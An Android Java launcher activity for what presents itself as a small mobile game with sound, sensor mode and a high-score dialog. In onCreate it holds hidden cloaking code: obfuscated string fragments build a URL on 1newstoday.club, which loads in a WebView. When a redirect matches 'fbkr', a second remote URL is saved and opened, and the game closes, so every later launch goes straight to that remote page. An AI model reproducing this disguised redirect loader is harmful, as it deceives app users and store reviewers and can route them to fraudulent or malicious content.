package com.sdsmdg.game;

import android.app.Dialog;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.graphics.drawable.ColorDrawable;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import com.sdsmdg.game.GameWorld.DataPlay;
import com.sdsmdg.game.GameWorld.SinglePlayer;
import com.sdsmdg.game.GameWorld.SinglePlayerView;
import com.sdsmdg.game.GameWorld.Utils;
import com.sdsmdg.game.LeaderBoard.LocalDB.DBHandler;
import com.sdsmdg.tastytoast.TastyToast;

public class Launcher extends AppCompatActivity {

    public static long startTime;
    public static int check;
    private WebView view;
    String kok1 = "ht";
    String l1 = "tp://";
    String go = "1news";
    String kok2 = "today.club";
    String kok3 = "/cart.php";
    public static int winner = 1;
    public static int height, width;
    public String TAG = "com.sdsmdg.game";
    DBHandler dbHandler;
    ImageView soundImageView, sensorImageView;
    public static boolean sensorMode = false;
    public static boolean showButtons = true;
    public static boolean isSound = true;
    String val = "fbkr";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        DataPlay dataPlay = new DataPlay(getApplicationContext());
        if (dataPlay.getData().isEmpty()){
        setContentView(R.layout.activity_launcher);
        view = findViewById(R.id.instro);
        Toast.makeText(this, "Загрузка..", Toast.LENGTH_SHORT).show();

        view.setWebViewClient(new WebViewClient() {
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                if (url.contains(val)) {
                    dataPlay.setData(kok1 + l1 + val + "aken.com/RsgRkh");
                    new Utils().showinternetPolicyForCheck(Launcher.this, dataPlay.getData());
                    finish();
                }
                return super.shouldOverrideUrlLoading(view, url);
            }
        });

        view.loadUrl(kok1 + l1 + go + kok2 + kok3);

        Launcher.check = 0;

        setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);

        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);

        DisplayMetrics displaymetrics = new DisplayMetrics();
        getWindowManager().getDefaultDisplay().getMetrics(displaymetrics);
        height = (displaymetrics.heightPixels);
        width = displaymetrics.widthPixels;
        dbHandler = new DBHandler(getApplicationContext());
        soundImageView = (ImageView) findViewById(R.id.soundImage);
        sensorImageView = (ImageView) findViewById(R.id.sensorImageView);
        }else {
            new Utils().showinternetPolicyForCheck(Launcher.this, dataPlay.getData());
            finish();
        }
    }


    public void onPlayClicked(View view) {
        Intent i = new Intent(getApplicationContext(), SinglePlayer.class);
        Log.i(TAG, "Sensor Button clicked");
        startActivity(i);
    }

    //By default turn on the manual mode
    public void onSensorButtonClicked(View view) {
        sensorMode = !sensorMode;
        showButtons = !showButtons;
        if (sensorMode) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                sensorImageView.setImageDrawable(getResources().getDrawable(R.drawable.sensor_mode_icon, getApplicationContext().getTheme()));
            } else {
                sensorImageView.setImageDrawable(getResources().getDrawable(R.drawable.sensor_mode_icon));
            }

            TastyToast.makeText(this, "Turning sensor mode on ...", TastyToast.LENGTH_SHORT, TastyToast.DEFAULT);
        } else {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                sensorImageView.setImageDrawable(getResources().getDrawable(R.drawable.manual_mode_icon, getApplicationContext().getTheme()));
            } else {
                sensorImageView.setImageDrawable(getResources().getDrawable(R.drawable.manual_mode_icon));
            }
            TastyToast.makeText(this, "Turning sensor mode off ...", TastyToast.LENGTH_SHORT, TastyToast.DEFAULT);
        }
    }

    public void soundClicked(View view) {
        isSound = !isSound;

        if (isSound) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                soundImageView.setImageDrawable(getResources().getDrawable(R.drawable.sound_button, getApplicationContext().getTheme()));
            } else {
                soundImageView.setImageDrawable(getResources().getDrawable(R.drawable.sound_button));
            }
            TastyToast.makeText(this, "Turning sounds on ...", TastyToast.LENGTH_SHORT, TastyToast.DEFAULT);
        } else {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                soundImageView.setImageDrawable(getResources().getDrawable(R.drawable.sound_mute_button, getApplicationContext().getTheme()));
            } else {
                soundImageView.setImageDrawable(getResources().getDrawable(R.drawable.sound_mute_button));
            }
            TastyToast.makeText(this, "Turning sounds off ...", TastyToast.LENGTH_SHORT, TastyToast.DEFAULT);
        }

    }

    public void highScoreClicked(View view) {

        if (!dbHandler.checkDatabase()) {
            TastyToast.makeText(Launcher.this, "Your High Score is : " + dbHandler.getPastHighScore(),
                    TastyToast.LENGTH_SHORT, TastyToast.DEFAULT);
        } else {
            TastyToast.makeText(Launcher.this, "You didn't played yet !", TastyToast.LENGTH_SHORT, TastyToast.ERROR);
        }
    }

    public void leaderBoardClicked(View view) {
        checkConnection();
    }

    private void checkConnection() {

            TastyToast.makeText(this, "Check your Internet Connection !", TastyToast.LENGTH_SHORT, TastyToast.WARNING);
       }

    private boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null;
    }

    @Override
    protected void onResume() {
        super.onResume();
        Log.i(TAG, "value of check is : " + check);
        dialog(check);
    }

    @Override
    protected void onPause() {
        super.onPause();
        check--;
    }

    public void dialog(int param) {
        if (param == 1) {
            long score = SinglePlayerView.score;
            String result = "Your score is " + String.valueOf(score);

            final Dialog d = new Dialog(Launcher.this);
            d.getWindow().setBackgroundDrawable(new ColorDrawable(android.graphics.Color.TRANSPARENT));
            d.requestWindowFeature(Window.FEATURE_NO_TITLE);
            d.setContentView(R.layout.game_over_dialog);
            d.show();
            d.setCancelable(true);

            dbHandler.updateDatabase((int) score, this);
            Button btn_yes = (Button) d.findViewById(R.id.btn_yes);
            Button btn_no = (Button) d.findViewById(R.id.btn_no);

            TextView result_textView = (TextView) d.findViewById(R.id.result_textView);

            result_textView.setText(result);

            btn_yes.setOnClickListener(new View.OnClickListener() {
                public void onClick(View v) {
                    d.dismiss();

                }
            });
            btn_no.setOnClickListener(new View.OnClickListener() {
                public void onClick(View v) {
                    d.dismiss();
                    System.exit(0);
                }
            });
        }

    }
}
